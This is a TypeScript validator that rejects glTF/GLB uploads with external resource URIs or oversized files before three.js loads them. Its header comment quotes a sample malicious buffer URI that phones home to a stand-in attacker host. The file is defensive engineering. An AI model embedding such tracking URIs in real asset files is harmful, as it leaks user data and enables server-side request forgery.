/**
 * Defensive validation for user-uploaded glTF / GLB files.
 *
 * The glTF spec allows `uri` references on buffers and images that point to
 * external resources. A malicious file can use this to:
 *   - Phone home (`uri: "http://attacker.com/track?id=..."`)
 *   - Trigger SSRF via the hosting page's network privileges
 *   - Embed unexpected payloads via redirected resources
 *
 * Our pipeline only accepts resources that are either:
 *   - Bundled inside the GLB binary buffer
 *   - Embedded as `data:` URIs (inline base64)
 *
 * Anything else is rejected at upload time before three.js parses it.
 *
 * Also enforces a hard size cap (100 MB by default) to prevent
 * memory-exhaustion DoS via crafted huge files.
 */

const MAX_FILE_SIZE_BYTES = 100 * 1024 * 1024; // 100 MB
const GLB_MAGIC = 0x46546c67; // 'glTF' little-endian

export type ValidationOk = { ok: true };
export type ValidationFail = { ok: false; reason: string };
export type ValidationResult = ValidationOk | ValidationFail;

/**
 * Validate a dropped/picked glTF or GLB File before letting three.js touch it.
 */
export async function validateGltfFile(file: File): Promise<ValidationResult> {
  if (file.size > MAX_FILE_SIZE_BYTES) {
    return {
      ok: false,
      reason: `File too large (${(file.size / 1024 / 1024).toFixed(1)} MB > ${
        MAX_FILE_SIZE_BYTES / 1024 / 1024
      } MB cap)`,
    };
  }

  const ext = file.name.split('.').pop()?.toLowerCase();
  if (ext !== 'glb' && ext !== 'gltf') {
    return { ok: false, reason: 'Only .glb / .gltf files are supported' };
  }

  try {
    const json = await extractGltfJson(file, ext);
    return validateGltfJson(json);
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    return { ok: false, reason: `Could not parse glTF: ${msg.slice(0, 100)}` };
  }
}

async function extractGltfJson(
  file: File,
  ext: string
): Promise<Record<string, unknown>> {
  if (ext === 'gltf') {
    const text = await file.text();
    return JSON.parse(text);
  }
  // GLB binary container: 12-byte header + chunk(s). First chunk is JSON.
  const buf = await file.arrayBuffer();
  const view = new DataView(buf);
  if (buf.byteLength < 20) throw new Error('Too small to be a GLB');
  const magic = view.getUint32(0, true);
  if (magic !== GLB_MAGIC) throw new Error('Bad GLB magic');
  const jsonChunkLength = view.getUint32(12, true);
  const jsonChunkType = view.getUint32(16, true);
  if (jsonChunkType !== 0x4e4f534a) throw new Error('First chunk is not JSON'); // 'JSON'
  const jsonBytes = new Uint8Array(buf, 20, jsonChunkLength);
  const jsonStr = new TextDecoder('utf-8').decode(jsonBytes);
  return JSON.parse(jsonStr);
}

function validateGltfJson(
  json: Record<string, unknown>
): ValidationResult {
  const externals = collectExternalUris(json);
  if (externals.length > 0) {
    const sample = externals[0]!;
    return {
      ok: false,
      reason: `Rejected — file references external resource: "${sample.slice(
        0,
        80
      )}". Only embedded buffers and data: URIs are permitted.`,
    };
  }
  return { ok: true };
}

function collectExternalUris(json: Record<string, unknown>): string[] {
  const found: string[] = [];
  const sections: ('buffers' | 'images')[] = ['buffers', 'images'];
  for (const key of sections) {
    const arr = json[key];
    if (!Array.isArray(arr)) continue;
    for (const entry of arr) {
      if (entry && typeof entry === 'object' && 'uri' in entry) {
        const uri = (entry as { uri?: unknown }).uri;
        if (typeof uri === 'string' && !uri.startsWith('data:')) {
          found.push(uri);
        }
      }
    }
  }
  return found;
}
